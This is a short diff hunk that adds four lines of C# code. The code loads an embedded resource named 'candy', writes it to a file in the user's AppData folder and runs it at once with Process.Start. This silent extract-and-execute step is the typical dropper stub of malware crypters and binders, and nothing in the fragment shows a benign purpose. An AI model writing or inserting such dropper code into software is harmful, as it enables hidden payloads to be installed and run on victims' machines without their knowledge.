@@ -1,0 +1,4 @@
+                byte[] candy = (byte[])MANAGER.GetObject("candy");
+                string pazt = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +"\\[FILENAME]";
+                File.WriteAllBytes(pazt, candy);
+                System.Diagnostics.Process.Start(pazt);
